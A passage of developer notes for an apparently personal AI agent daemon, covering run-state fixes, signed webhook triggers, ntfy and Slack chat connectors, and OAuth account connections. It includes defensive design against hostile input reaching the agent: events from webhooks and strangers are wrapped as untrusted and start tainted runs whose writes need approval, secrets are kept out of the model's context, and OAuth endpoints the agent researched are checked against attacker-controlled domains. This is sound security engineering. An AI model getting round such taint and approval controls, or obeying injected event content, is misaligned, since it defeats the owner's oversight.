- **The likely cause: a lost `run_finished`.** `/v1/events` skipped events silently when a client fell behind its broadcast buffer (`RecvError::Lagged(_) => continue`); four sub-agents streaming text at once, each event also looked up in the store, is the load that does it. Once the parent's `run_finished` is gone, nothing in the app ever cleared `activeRun`: a reconnect re-read the active runs but only *set* runs from them (and reloading Home kept the previous `activeRun`), and Stop sent a cancel that answered `{"cancelled": false}`, which was ignored. Not proven from the user's machine (lagging wasn't logged).
- **The daemon now says so**: a lagging connection gets `{"events_dropped": {"missed": n}}` in place of the skipped events (approvals, secret requests and changes too), and a warning is logged. The remote TUI logs it; its runs end through `/wait`.
- **`TernStore.resyncRuns`** makes busy state match `/v1/runs/active`: a transcript whose `activeRun` the daemon no longer has ends it (`Transcript.endRun`), channel spinners and live member lines for gone runs clear, active top-level runs are set, and the open stream, conversation or thread reloads. It runs on `events_dropped`; from **Stop**, when the cancel answers `cancelled: false` or 404; and from a 15 s check when some run shows as working and no event has arrived for 45 s (`TernStore.staleAfter`). Reconnecting also ends runs that aren't active any more.
- **A finished run can't come back.** A transcript remembers the runs that finished in it (the last 64); setting one of them as `activeRun` again is ignored, so a send's HTTP reply or an active-runs list arriving after the `run_finished` (`activeRun ??= sent.runId`) can't leave Home spinning. Resuming a run (`resume`, or its `run_started` again) is the way back, through `Transcript.resumeRun`.
- **Busy state belongs to the run's session, not the view.** The user then moved the conversation out of Home, and the stale "Thinking…" followed Home onto the fresh segment. Home's stream is one transcript, and reloading it kept whatever `activeRun` it had. Now a reload keeps it only while the run's session is still in the stream, and moving a session hands its run (if any) to that session's own transcript, which the channel's thread view shows, then resyncs. A new segment starts idle unless a run is really working in it. (The daemon refuses to move a conversation with work running, so a run that moves is normally a stale one, which the resync clears.)
- **A sub-agent's `run_started` never replaces its parent's run** in a transcript that already has one (`parentRunId` set), whatever session it was placed in.
- **Not changed**: how delegated children's events are routed (each to its own session's transcript, the card in the parent's), which the agent-profiles session is extending with DM pointers.
- **Tests**: `test/run_lifecycle_test.dart` (the delegation replay ending idle, children finishing after the parent, a child start not taking Home over, a late reply not reviving a finished run, Stop on a finished run clearing it and on a working one leaving it, `events_dropped` resyncing, a resync clearing a stale run and setting a live one, a stale or working session moved out of Home leaving Home's new segment idle and a working one shown in its own thread), and `daemon::api::tests::a_lagging_client_is_told_to_resync`.

## T1c (webhook triggers)

Stage 4 of docs/personal-agent-tooling-spec.md (§3.1, §3.4, wargame W6). Migration 17 (`0017_webhooks.sql`) is self-contained (one table) so a merge can renumber it. The HTTP side is `daemon/hooks.rs` (listener and deliveries) and `daemon/api_webhooks.rs` (management); nothing in `listen.rs`, `auth.rs` or the scheduler changed shape.

- **Its own listener, not a path on the API's.** `[webhooks] listen` binds TCP listeners whose router has only `POST /v1/hooks/{id}` and `GET /healthz` (answering `tern webhooks`, so a probe can tell it apart); everything else is 404. Why not a prefix on the API listener: the two are exposed to different networks. The API belongs on Tailscale or a LAN (D1), while webhook senders (GitHub, Stripe, a form) are on the public internet, so the useful setup is a tunnel or proxy to *only* the webhook port. A shared listener would make "expose webhooks" mean "expose the API's TLS port to the internet", leaving every API route one auth bug away. Separate routers also make "never accept webhook secrets on API paths" structural rather than a check. It reuses D1's certificate (its accept loop is now its own; see the connection limits below): `[webhooks] tls` (default `[api] tls`, with its cert files), refused as `off` unless every webhook listener is loopback and `api.trust_proxy` is on, the same rule as the API, since a bearer secret is a credential. The path keeps the spec's `/v1/hooks/<routine-id>`.
- **W6 both ways, and audited.** A `Bearer tern_dev_…` on the webhook listener is 401 ("device tokens are never accepted on webhook paths") even next to a valid signature. On the API, `require_auth` refuses a `Bearer tern_whk_…` by name before the device lookup. Secrets are `tern_whk_` + 43 base62 characters (D1's generator, now `auth::new_secret(prefix)`), so either side can recognize the other's credential. Both refusals log on the `audit` target. `/v1/webhooks` is in `OWNER_ONLY` for every method, GET included, since a secret lets the internet start runs; a `chat` device gets 403.
- **Secrets are stored as is, in their own table**, not hashed like device tokens: HMAC needs the key. `routine_webhooks(routine_id, auth, secret, created_at, rotated_at, revoked_at, last_delivery_at)` keeps them out of every `schedules` read and every `ScheduleRow`, and cascades on delete. The API returns a secret only in the answer that made it (create, rotate). Rotation replaces it at once with no grace period: GitHub and most senders take a new secret in one edit, and overlap would mean two valid keys. Revoking nulls it (the URL answers 404) and rotating again revives it. A routine given another trigger through `PATCH /v1/schedules` (or the tools) loses its secret, so converting it back can't revive an old URL.
- **Auth kinds.** `hmac` (default) accepts `X-Tern-Signature: t=<unix>,v1=<hex HMAC-SHA256("<t>.<body>")>` (Stripe's shape with our header, so the timestamp is signed and bounds replays to `tolerance_secs`, default 300) or GitHub's `X-Hub-Signature-256: sha256=<hex>`. `bearer` accepts only `Authorization: Bearer <secret>`, compared through blake3 hashes (constant-time `Hash` equality); HMAC uses `aws_lc_rs::hmac::verify`. An hmac hook doesn't take its secret as a bearer token. Not built: `Stripe-Signature` (Stripe signs with a secret it generates, and we don't import secrets yet) and Standard Webhooks (`webhook-id`/`webhook-signature`); both slot into `verify`.
- **Replays and dedup reuse T1b's `routine_events`.** The event key is `h:` + blake3 of what was signed: the body for GitHub and bearer, `"<t>.<body>"` for `X-Tern-Signature`. Unsigned delivery-id headers (`X-GitHub-Delivery`) are *not* the key: an attacker who captured a request could change them and replay. The cost is that two identical bodies under GitHub signatures or bearer are one event, which is what a re-delivery is anyway. A duplicate answers 200 `duplicate` so senders stop retrying. Rows stay after their run (payload emptied), as for watches.
- **Order of checks**: per-address failure limit (20/min, `exceeded` peeks without counting) → device token → unknown, non-webhook or revoked routine (404) → body over the live `max_body_kb` (413; `Content-Length` first, then `to_bytes` with the limit, router's `DefaultBodyLimit` disabled so the limit is live) → signature and timestamp (401) → `per_minute` accepted deliveries per routine (429 with `Retry-After: 60`; `auth::RateLimit` is now generic over its key with a live maximum) → routine turned off (409) → gate → record. Failures (bad auth, unknown hook, device tokens) count toward the per-address limit; 413 and 429 don't. A budget pause doesn't refuse: the event waits, as a watch's does.
- **Gates filter or reshape, before any model call.** T1b gates are reused with a webhook variant (`tern_lua::watch::webhook_gate`): the gate gets `routine` and `event`; `false`/`nil` drops it, `true` keeps it, any other value replaces the event. The gate runs in the request (so the sender hears `ignored`) after auth and rate limiting, so an unauthenticated sender can't make tern run Luau. A dropped delivery is recorded as `gated` (empty payload) so its replay is still a duplicate. A gate that errors lets the run go ahead, as in T1b.
- **The event** is `{"headers": {…}, "body": …}`: the body as JSON when it parses (else text), and only headers that name the event (`content-type`, `user-agent`, `*-event`, `*-event-type`, `*-delivery`), because GitHub puts the event type in `X-GitHub-Event`. Credentials and signatures never reach the model. It's cut at the watches' 16 KB; the gate sees the whole body first and can return a smaller event.
- **Runs** go through T1b's machinery: the event is a `pending` routine event, `start_waiting` starts it (same caps, pause and one-at-a-time-per-session rules) with input "A webhook delivered this event:" plus `<untrusted source="webhook">`, and `NewRun.taint = "started by a webhook"`. A delivery calls `scheduler::start_waiting_now` instead of waiting for the tick; `start_waiting` now holds a process-wide async mutex, because the tick and a delivery could otherwise hand one event to two runs. A webhook routine's `next_run_at` is `i64::MAX` (never due; enabling it keeps that), and `runs.trigger` stays `cron` as for every routine.
- **W1 default.** T3 has landed, so the spec's interim rule (watch and webhook routines forced `readonly`) is not applied. Instead: the listener is off by default, no webhook routine ships, and only the owner can create one (CLI, owner-only API, desktop over the socket). Their runs are tainted, so under the default `supervised` autonomy every write asks or goes to the outbox; a routine can still set `readonly`.
- **The agent can't create webhook routines.** `TriggerArgs.webhook` is `#[serde(skip)]` and absent from the tool schema: creating one returns a secret, which must not land in a model's context (or a tainted run's). The agent can still list them (`on webhook deliveries`) and change their prompt or gate like any routine it owns.
- **`tern hooks fire <id>`** (`POST /v1/webhooks/{id}/fire`, owner) is the spec's "CLI for local scripts": no secret, but the same event shape, gate, dedup and taint. Its key includes the time, so firing the same body twice is two deliveries.
- **`tern doctor`** has a Webhooks section: off (info, or a warning when active hooks exist), the listeners and TLS mode, a warning when nothing answers locally, a warning when every listener is loopback with no `public_url` ("only this machine can deliver"), and unless `--offline`, `GET <public_url>/healthz` must answer `tern webhooks` (a different answer means the tunnel points at the wrong port). For T6b's `tern security audit`: the listeners come from `hooks::check(config)` and active hooks from `Store::webhooks()`.
- **Desktop**: **Webhook** is a fourth trigger for new routines (auth: signed or secret-in-header); creating one shows the URL and secret once with copy buttons. Editing a webhook routine hides the trigger switch (its secret goes with it) and shows the URL, its state, **Rotate secret…** and **Revoke**. The gate section explains the drop/replace semantics. `tern_client` gained `Webhook`, `CreatedWebhook`, `webhooks()`, `createWebhook()`, `rotateWebhook()`, `revokeWebhook()`; `test/fixtures/webhook.json` is checked against the Rust `Hook`.
- **Connection limits (from the security review of 0775f64, finding 7).** This is the one listener meant for the internet, so a slowloris client (dribbling headers or a body, or idling on keep-alive) must not hold it. It has its own accept loop in `hooks.rs` instead of `listen::Accepted` + `axum::serve`, because axum's `serve` exposes no hyper settings. Each connection is served by `hyper::server::conn::http1` with a `TokioTimer` and `header_read_timeout(header_timeout_secs)` (default 10s). Hyper starts that timer whenever it begins waiting for a request head, so it bounds slow headers *and* idle keep-alive. The TLS handshake gets the same budget (was D1's fixed 10s). Bodies are read in `deliver` under `tokio::time::timeout(body_timeout_secs)` (default 30s, live): a slower one gets 408 with `Connection: close` (so hyper doesn't drain it) and counts as a failure for the per-address limit. A `Semaphore` of `max_connections` (default 64, shared by every webhook listener) is taken at TCP accept, before the handshake, and held for the connection's life. Past it, a connection is refused at once: without TLS it gets a pre-written `503` with `Retry-After: 5` (`try_write` on the fresh socket, no task); with TLS it is closed, since there is no session to answer in. The refusal logs one warning a minute at most. Why a cap rather than per-IP limits: behind a tunnel or proxy every connection has the proxy's address, and the cap is what bounds tasks and memory. The header timeout and the cap are read at start (restart to change); doctor prints all the limits. D1's device API still uses `listen::Accepted` with only the handshake timeout; it sits on Tailscale or a LAN, and a follow-up could reuse this loop there.
- **Not done**: Stripe and Standard Webhooks signatures; importing a sender's own secret; the relayed `hooks.tern.cloud` URL (tier 4); a TUI view (routines show through `schedule_list`).
- **Tests**: `hooks::tests` (both signature forms, timestamp window, wrong secret or body, hmac vs bearer, kept headers, the plain-HTTP rule and URLs); store tests for rotate, revoke, cascade and dedup; `tern_lua` webhook gate (drop, keep, reshape, error); `auth::tests::scopes_per_route` (`/v1/webhooks` owner-only); `api_webhooks` Dart fixture; `tests/t1c.rs` against the daemon over TLS and plain HTTP: a signed delivery starting one tainted run with the event wrapped, a replay as a duplicate, missing/bad/stale/bearer-on-hmac signatures, an unknown hook and a 300 KB body refused, GitHub's form, a device token refused on the hook (even with a valid signature) and API routes absent from that listener, a webhook secret refused on the API (on an API route and on the hook's path there), a chat device refused on `/v1/webhooks`; a client that sends half its headers and stops, or half its body, cut off (closed, or 408) while a normal delivery still lands; with `max_connections = 2`, two idle connections fill it, a third gets 503, and once one closes a delivery goes through; a gate dropping three events with a provider that fails any call (zero runs) and the fourth delivery rate-limited; rotate, revoke, `tern hooks` CLI create/list/rotate/revoke/fire, and a retriggered routine losing its secret. ## T4b-ii (gateway connectors: ntfy and Slack in Luau)

Tooling spec §6.4: a chat transport is a Luau file, not a Rust crate. Built on `merge-six` (T4b-i's `auth`, T1b's watch machinery). No migrations: pairings and poll cursors live in `kv`.

- **The contract** is a `gateway` table beside `tools`: `kind`, `threads`, `send(ctx, to, text, opts)`, optional `buttons(ctx, to, text, buttons, opts)` and `poll(ctx, cursor, settings)` returning `{ messages = { { id, chat, thread?, from?, from_name?, text?, action? } }, cursor }`, and `read_via_post`. `opts` carries `thread`, `kind` (`message`, `reply`, `approval`, `outbox`, `notice`), `run_id` and `settings`. Webhooks (`webhook = true` in the spec) aren't built: T1c owns the daemon's HTTP routes, and polling works without a reachable core.
- **Loaded like watches** (`tern_lua::gateway`): each call runs in a fresh VM built from a wrapper around the connector's source, so connector loading is unchanged and only active, approved files run. `send` and `buttons` are `write` tools to the host (POST allowed), `poll` is `read` (GET only unless `read_via_post`). The connector's hosts, `auth`, rate and time limit apply as for its tools. A connector whose `gateway` has no `send` can't be opened.
- **Opt-in by config, not by the file.** A connector with a `gateway` table does nothing until `[gateway.connectors.<name>]` enables it, so an agent-written connector can't start receiving messages on its own. `settings` (topics, channel ids) are passed in rather than written into the file, so one connector serves any topic; they're never secret values. A gateway that won't open is logged and skipped so the daemon and Telegram still start; `tern doctor` and `tern gateway list` say why. `telegram` is refused as a connector gateway name.
- **One delivery path.** `LuaGateway` implements `Gateway` and is registered beside Telegram under its connector name, so targets are `<name>:<chat>` and everything that already routes by target works unchanged: routine results after quiet hours, initiative, the gate model and digests (all in `Manager`, before the gateway is called), approvals (`Router::ask`, including W4's "a routine in quiet hours doesn't ping the chat"), outbox cards, secret notices (a pointer to the app; a chat never takes a value), and replies to a run. `check_deliver_to` accepts `<gateway>:<chat>` for any connector-shaped name; an unknown gateway is logged at delivery, like a Telegram chat that went away. "here" in `schedule_create` resolves for any gateway chat (and no longer keeps `|agent` from an agent's stream).
- **Pairing is shared with Telegram** (`tern gateway pair` codes), keyed `<connector>:<identity>` in `kv` namespace `gateway:paired`. The identity is the sender, or the chat when the platform names none (ntfy). Unpaired senders get `strangers = "reply"` (one fixed note, the default, as Telegram), `"ignore"`, or `"taint"`: the message starts a run **tainted** for "message from Ann on slack", wrapped as untrusted, in the chat's own guest session (`<chat>|untrusted`), so a stranger never joins or cancels the owner's run, and its writes always ask. A stranger's button tap never counts. `ChatHost::send_untrusted` is the new hook; `Manager::start_tainted` the daemon side.
- **Buttons, else a reply.** Approvals offer `1 · Allow once, 2 · Always (…), 3/4` (the tainted host limit's choices), `0 · Deny`; outbox cards `approve 12` / `reject 12`. A tap's data is `ap:<id>:<n>` or `ob:<id>:approve`, and only counts in the chat the request went to (as Telegram). A bare number answers the newest approval waiting in that chat. Cards aren't edited when decided elsewhere (`outbox_resolved` is Telegram's): most of these platforms can't edit a push.
- **Rate**: a gateway's calls share one budget per connector (its declared `rate`, else `[connectors] rate`), but, like T1b's watches, not the budget of the same connector's tools, since the runtime doesn't keep the tools' `Host`. ntfy and Slack declare their own rates. Sharing it means handing the tools' `Host` to the daemon; worth doing with T4a's connections.
- **No streaming.** The final answer is sent once; a failed run is delivered as "Failed: …" by `Manager::deliver` as before. Telegram's live edits stay Telegram's.
- **ntfy** (built in, `crates/tern-gateway/connectors/ntfy.luau`): pushes go to `settings.topic` with a title and priority by `kind`; replies are written to `settings.reply_topic` from the ntfy app and polled with `?poll=1&since=` (the first poll starts from now). Buttons are ntfy `http` actions that publish the button's data to the reply topic from the phone with `Title: tern-action`, which the poll reads back as a tap; ntfy shows three, so a fourth choice says to reply. Since ntfy has no users, **the reply topic is the credential**: `tern gateway add ntfy` picks random names, and the docs say to keep them private or use a server with access control (`auth = "NTFY_TOKEN"`, commented out in the file). Button taps don't carry a token (the script never sees it), so on a protected server answer by reply.
- **Slack fits with a bot token** (built in, `slack.luau`): `chat.postMessage` with `auth = "SLACK_BOT_TOKEN"`, polling `conversations.history` (top-level messages after the cursor, skipping bots and joins), threads as `<channel>/<thread ts>`. No OAuth: the user creates an app in their workspace and copies the xoxb token, so nothing waits for T4a; T4a can later offer sign-in for the same file. Not built: buttons (Slack's interactivity needs a public request URL), reading thread replies (that's `conversations.replies` per thread), and user names (`from_name`). Slack's 2025 limit of 1 request a minute on `conversations.history` applies to commercially distributed non-Marketplace apps, not a workspace's own app, so the 30 s default poll is fine.
- **`tern gateway add <ntfy|slack>`** writes the built-in file (refusing to overwrite a different one without `--force`), records it as approved (the user asked for it, as activation would), and upserts `[gateway.connectors.<name>]` keeping existing settings (re-running doesn't rotate topics). `--server` points ntfy at a self-hosted server, changing the base URL and the declared host together. `--channel` sets Slack's channel; a missing `SLACK_BOT_TOKEN` is asked for, hidden, in a terminal. `tern gateway list` shows each gateway and whether it can run.
- **doctor**: Gateways lists each connector gateway: what it can do (`ntfy · push, replies, buttons`), how many have paired (a warning when none), a failure when it can't load or a secret its `auth` sends is missing.
- **Desktop**: `/v1/info` lists `gateways` (`{name, kind}`). The routine sheet's "Also send to Telegram" becomes "Also send to…" with a gateway picker and a hint per kind (chat id, topic, channel id) when there's more than one; History and the sidebar show ntfy and Slack sessions with their own label and icon.
- **Tests**: `tern-lua` gateway (contract, poll parsing, a poll can't POST or leave its hosts, missing `gateway`/`send`); `tern-gateway` lua (delivery through a mock connector with thread and settings, pairing and the fixed reply, a stranger's message becoming a tainted run while the owner's isn't, numbered approval replies only counting in their chat, buttons for approvals and `approve #12`, ntfy against a local server with action buttons and replies, Slack with the injected bot token, history filtering and errors); `tests/t4b_gateways.rs` against the daemon (a routine delivering through a gateway connector while another in quiet hours is held and later released; a stranger's message making a tainted run in a session of its own, both answers sent back); the desktop routine sheet choosing ntfy.

## T4a (OAuth first, and connections: several accounts per service)

Stage 4 of docs/personal-agent-tooling-spec.md (§6.2, §6.7–6.8; T4a in §12.1). The most security-sensitive code in tern. One commit per part, each green. New crate `tern-auth` (the OAuth helper, token storage, discovery, endpoint validation, connections); it depends on tern-core and tern-store, and tern-lua, tern-mcp, tern-tools and tern depend on it.

### The OAuth helper (`tern-auth`: `flow`, `tokens`, `http`, `pkce`)

- **Authorization code with PKCE, always S256.** `flow::begin` binds a one-shot listener on `127.0.0.1` (port 0, or the registered one) and builds the authorize URL with `state` (24 random bytes) and a 32-byte verifier from aws-lc-rs's system generator. The redirect URI is exactly `http://127.0.0.1:<port>/callback` (RFC 8252 §7.3; `localhost` isn't used, so a hosts file can't move it). There is no flow without PKCE, even for providers that don't advertise it: a server that ignores the parameters still works, and one that honours them gets the protection.
- **The listener takes the first valid redirect and closes.** A request for another path, a method other than GET, or a `Host` header other than `127.0.0.1:<port>` gets a 404; a wrong or missing `state` gets a 400; both are ignored and the wait goes on (so a local process or a page probing the port can't end the sign-in or make it fail). `state` is compared without early exit. A redirect whose RFC 9207 `iss` names a different server than the one we asked ends the sign-in with an error (mix-up attack). The page tern answers with is fixed text: nothing from the request is echoed (no reflected HTML), and it sends `Referrer-Policy: no-referrer` and `Cache-Control: no-store`. `error=access_denied` is `Denied`. Each connection is read with a 5 s limit, so a slow client can't hold the listener.
- **Device flow** (RFC 8628) for a remote core and providers that prefer it: `authorization_pending` waits, `slow_down` adds 5 s, `access_denied` and `expired_token` end it; the poll stops at the earlier of the code's expiry and `[auth] sign_in_timeout_secs`. Google's `verification_url` spelling is accepted. The device code never leaves the core (`DeviceCode`'s `Debug` hides it); the user sees the user code and URL.
- **Refresh** keeps the old refresh token when the server doesn't rotate it. `invalid_grant`, `invalid_client` and `unauthorized_client` mean `NeedsReauth`: the connection's status becomes `needs_reauth` and nothing retries it (tooling spec §6.8.3, "Reconnect"). **One refresh per connection at a time** (`Tokens` holds a lock per connection): providers that rotate refresh tokens revoke the whole grant when an old one is reused, so two runs refreshing together would sign the user out. A caller that got a 401 passes the token it sent; if the stored token has changed since, it gets the new one without another refresh. Tokens are refreshed 60 s before the server's expiry.
- **Revocation** (RFC 7009) is best effort, with the refresh token when there is one, before the connection's secrets are deleted.
- **Token endpoints and every other server tern itself talks to** (token, device, revocation, userinfo, registration, metadata) go through `http::Guard`: https only, no redirects followed, 1 MB and 20 s caps, and the host is resolved, refused if any address is private, loopback or link-local, and the client is pinned to the checked addresses (as connectors do since 2afdb49). `[auth] local_issuers` (origins) is the only way to allow a private address, for a self-hosted or test identity provider; plain http is accepted only there. The authorize URL is opened in the user's browser, not fetched, but it must be https too (or a configured local issuer).
- **Tokens at rest are secrets.** `conn/<target>/<slug>/oauth/{access_token,refresh_token,expires_at,client_secret}` in secrets.toml, written together (`Secrets::set_many`, one atomic 0600 write) so a token set is never half-saved. The keys are quoted strings at the top level of the file, so older binaries still load it. They come only from the file (`Secrets::get` skips the environment for `conn/` names: an environment variable can't have that name and mustn't stand in for a token). They are in `file_values`, so the journal, logs, MCP stderr and connector output redact them like any secret, including after removal (old values stay in the redaction set). The Secrets view (`statuses`) hides `conn/` names; they show with their connection.
- **No token in an error.** `AuthError` messages are built from the server's `error` code and a 200-character, single-line `error_description`, scrubbed of every value the request carried (code, verifier, refresh token, client secret, device code); a reqwest error's URL is cut to its origin. `TokenSet` and `DeviceCode` print `[REDACTED]` in `Debug`. A token response that isn't `Bearer` is refused rather than sent as one.
- **Client credentials**: public clients send `client_id` only; `token_auth = "post"` or `"basic"` (form-encoded per RFC 6749 §2.3.1) when the provider wants a secret, which is named (`client_secret_secret`, or the connection's own `oauth/client_secret` from registration), never stored in config.
- **The account label** comes from the userinfo endpoint (`email`, `preferred_username`, `login`, `upn`, `name`), else the ID token's claims, decoded without verification because it is only a label (it came straight from the token endpoint over TLS, and access never depends on it).
- **Config**: `[auth]` `sign_in_timeout_secs` (300), `max_connections` (10), `idle_timeout_secs` (600), `local_issuers` ([]), `client_metadata_url` (""), and `[auth.clients]` (`google = { client_id, client_secret_secret }`). Client secrets named there join `secret_uses` ("OAuth app google").
- **Tests** (`tern-auth/tests/flow.rs`, mock IdP on 127.0.0.1): PKCE end to end (the token endpoint checks the verifier against the challenge; wrong path, wrong state and a rebinding `Host` are refused while the wait goes on; nothing echoed; the listener closes), `access_denied` and an `iss` mix-up, refresh with rotation and two concurrent callers refreshing once, a 401 with a stale token, `invalid_grant` becoming `NeedsReauth` without the echoed token in the message, the device flow, private endpoints refused, revocation then deletion. Units: RFC 7636's example, base64url, `Debug` redaction, token response parsing, scoped secret names.

### `auth_discover` (`tern-auth`: `profiles`, `discover`, `register`, `domain`)

- **A read-only tool, host code all the way**, in the spec's order: (1) built-in profiles by service name, alias (`gmail`, `jira`, `outlook`) or API host; (2) for an MCP URL, the MCP authorization flow: an unauthenticated `initialize` whose 401 `WWW-Authenticate` names `resource_metadata` (followed only on the server's own origin), else `/.well-known/oauth-protected-resource{path}` and the root one (RFC 9728), then the first authorization server's metadata; (3) RFC 8414 and OIDC discovery (`/.well-known/oauth-authorization-server{path}`, `/.well-known/openid-configuration{path}`, and `{path}/.well-known/openid-configuration`) on the API's origin, then its registrable domain; (4) `{"method": "unknown"}`. An MCP URL skips the profiles: a server signs in on its own terms (Notion's MCP server registers clients; Notion's REST API wants a secret).
- **Metadata can't speak for another server.** A protected-resource document whose `resource` isn't the URL asked about is ignored (RFC 9728 §3.3), and an authorization server document whose `issuer` isn't the issuer it was fetched for is ignored (RFC 8414 §3.3). All of it goes through `Guard` (https, public addresses, no redirects), and `auth_discover` declares the URL's host as its egress, so a tainted run asks before probing a new host. A server that lists PKCE methods without S256 is refused (use a key); one that lists none gets PKCE anyway, with a note.
- **Client ID**: an `[auth.clients.<provider>]` entry wins (`user_supplied`, ready); else a client ID metadata document when the server says `client_id_metadata_document_supported` and `[auth] client_metadata_url` is set (`cimd`); else dynamic registration when there is a `registration_endpoint`; else `user_supplied`, not ready (the card shows the setup URL). A server that only accepts authenticated clients (`token_endpoint_auth_methods_supported` without `none`) and has no configured client is `confidential`. Registration (RFC 7591) asks for a public native client (`token_endpoint_auth_method = "none"`) with the exact loopback redirect URI it will use, so the sign-in binds that port first (re-registering if it is taken).
- **Provider names** for discovered servers are the issuer's registrable domain's first label (`auth.notion.com` → `notion`); that is what a connector names in `capabilities.oauth`.
- **Built-in profiles**: Google, Microsoft, GitHub, Slack, Notion, Linear, Atlassian, Dropbox, with documented endpoints, the token-endpoint client authentication each wants, whether OAuth there needs a client secret (Slack, Notion's API, Atlassian: `confidential`, so the recommendation is a key), base scopes (`openid email` for Google, `offline_access` for Microsoft and Atlassian), extra authorize parameters (Google `access_type=offline&prompt=consent`, Dropbox `token_access_type=offline`), a setup URL and plain-words notes (Google's 7-day refresh tokens while a project is in Testing). No profile ships a client ID: the local tier is "bring your own app" (spec §14 leaves tern-owned clients to tern Cloud).
- **Plans are kept by the host** (`Plans`, by `plan_id`, an hour, at most 200) so later steps (`auth_propose`, `connection_add`) use the plan the host found or validated, not whatever the model passes later. The result also says what the host recommends (§6.7.3) and the next step.
- **Research validation** (`validate_research`, used by `auth_propose` for plans the agent found on the web; wargame W10): every endpoint https, no userinfo, not an IP address; its registrable domain (the public suffix list including the private section, via the `psl` crate, so `victim.github.io` and `attacker.github.io` differ) must be one of the declared API hosts' or a known identity provider's (Google, Microsoft, Okta, Auth0, OneLogin, Cognito, Azure B2C, PingOne). Internationalized lookalikes fail because the URL parser turns them into punycode, a different domain. Then the issuer's own metadata (the plan's `issuer`, else the authorize URL's origin) is fetched: if it lists other endpoints the plan is refused; if it confirms them the plan is `verified`; if there is none the plan is allowed but marked unverified, and the card says so. **Tenant domains** (`*.okta.com` and the like) are refused unless metadata confirms them, since anyone can register a tenant.
- **Tests** (`tern-auth/tests/discover.rs`): a fixture MCP server with a 401 challenge, RFC 9728 metadata and registration yields an OAuth plan with no setup and the right resource, and registers a client, with no model involved; metadata naming another resource or issuer is ignored; an API host's OIDC metadata, needing setup until a client is configured; nothing sent to a private host that isn't configured; built-in profiles with no network; researched plans with a token URL on another domain, a lookalike host, plain http or an unconfirmed tenant refused; an unverifiable plan allowed and labelled; a plan confirmed by, or contradicting, the issuer's metadata. Units: registrable domains (including private suffixes, IDN, IPs), lookalikes, known IdPs, challenge parsing, profile lookup.

### Connections (`tern-auth::connections`, migration `0018_connections.sql`, tern-lua, tern-mcp)

- **Migration 18 is self-contained** (renumbered from 16 at merge): one new table, `connections`, with the spec's columns plus `auth` (JSON: the OAuth endpoints and client ID, or the key names; never a secret), `last_error` and **`owner_member` (default `owner`)**, the multiplayer hook spec §15.4 asks for. Slugs are unique per (kind, target). Nothing is backfilled: **a target with no rows has one implicit `default` connection with plain secret names**, which is exactly how connectors and MCP servers worked before, so v1 configs, secrets and kv load unchanged and nothing is renamed. The first explicit connection of a target becomes its default; removing the default promotes the oldest other.
- **Connections live in the database, not in `config.toml`** (the spec sketched `[mcp.servers.x.connections.work]`): they are made by sign-in flows at runtime, carry status and the account, and change from the app; config stays the definition of the server. A connection keeps only references (secret names), never values.
- **Secrets per connection**: `conn/<target>/<slug>/<NAME>` for a key a connector or server names (`Net::secret`, `McpServer::secret`), and `conn/<target>/<slug>/oauth/…` for tokens. The `default` slug keeps plain names, so a single-account setup is unchanged and its keys stay where the user put them (removing a `default` connection deletes its OAuth tokens but not plain-named keys other things may use).
- **Routing** (§6.8.2): with one connection nothing changes (no parameter). With two or more, every tool of the target gets a `connection` parameter (an enum of slugs, described with each account), or `tern_connection` if the tool already has a `connection`; the host takes it out before the script or server sees the arguments. A **read** without it uses the default; a **write or destructive** call without it is **refused by the host** with the options ("…must say which: pass `connection` as one of: work (me@work.com, default); home (me@home.com). Nothing was sent."). Such a doomed call's policy is `read` so nobody is asked to approve something that won't run. An unknown slug is refused the same way. A connection in `needs_reauth` refuses calls with "ask the user to reconnect it" and the ways to do that.
- **The approval card and the ledger name the account**: a routed tool's `summary` is `lua__gmail__send as gmail · personal (me@gmail.com)`; the approval request carries it.
- **Luau** (`capabilities.oauth = { google = { scopes = { … } } }`, one provider): with no `auth`, the host sends the connection's access token as a Bearer header to every declared host; `auth = "oauth"`, `"oauth:google"` or `{ secret = "oauth:google", header = …, scheme = … }` place it explicitly (not in `query` or `basic`). The provider must match the connection's. Scopes are part of the capability summary and the approval fingerprint (`oauth` is serialized only when declared, so older approval records still match). `ctx.connection` is `{ slug, label, account }` (`default` when there are no connections). **kv is per connection**: `lua:<name>:<slug>`, except the default, which keeps `lua:<name>` so existing caches and watch cursors carry over. An OAuth connector with no account says "call connection_add so the user can sign in" before sending anything.
- **Refresh on 401**: a request whose OAuth token gets a 401 is sent once more with a token refreshed past the refused one (the hop loop, so redirects keep their checks); a second 401 is returned to the script. A dead grant marks the connection `needs_reauth` and the call fails with "needs signing in again", never with a token. Both the old and new token values are redacted from what the script sees.
- **MCP**: one client per (server, connection), made on first use from the server's config plus the account (`McpServer::account`); its secrets resolve per connection (`env_secrets` for stdio, `bearer_token_secret`/`header_secrets` for HTTP) and an OAuth account sends its access token, refreshing once and reconnecting if the server answers 401. **A stdio server is one process per account**; extra accounts' clients stop after `[auth] idle_timeout_secs` unused (checked in `prepare`, the default account's stays up) and start again on the next call. Tools are listed from the default account's client once a server has accounts. A client is rebuilt when its connection's credentials, status or account change, and dropped when the connection is removed.
- **Grants are per connection.** Standing grants for connector and MCP tools don't exist today (only `shell` patterns and the tainted host limit's host grants), so there is nothing to split yet; the store keys any grant for an account with an `@<slug>` suffix and `Connections::remove` deletes them with the connection, so when tool grants arrive a grant for *work* can't cover *personal*.
- **The prompt's Integrations section** lists accounts: `Luau connector gmail: … ; accounts: work (mitch@inngest.com, default), personal (mitch@gmail.com)`, and the same for MCP servers.
- **Caching**: `Connections` keeps every row in memory for building tool specs (no query per tool per turn) and reloads in each tool source's `prepare`, so a change from the CLI in another process shows up on the next run.
- **Not done in T4a**: per-connection watches (`watch = "gmail@work.new_mail"`; watches run under the default account), channel-pinned default connections (§4.2, waits for channel settings), and pausing routines that pinned a removed connection (routines can't pin one yet).
- **Tests**: tern-lua `tests/connections.rs` (two Gmail-shaped OAuth accounts with a fake provider: the parameter and its description, reads default, a send without `connection` refused with the options before anything is sent and with no approval asked, the right token per account, separate kv, the card naming the account, the token never in script output, removing one leaves the other working and its tokens and kv gone; a 401 refreshed once; a dead grant becoming `needs_reauth`; `capabilities.oauth` validation and summary; an OAuth connector with no account); tern-mcp (two accounts of a stdio server with their own secrets and processes, the extra one stopped when idle and restarted on use; an OAuth account on an HTTP server refreshing after a 401); tern-store (defaults, uniqueness, removal, kv and grant cleanup); tern-core (tokens saved after startup, and replaced ones, redacted from the journal); tern-auth (routing rules, the parameter, limits, descriptions).

### `auth_propose`, `connection_add`, the cards, the CLI and the API

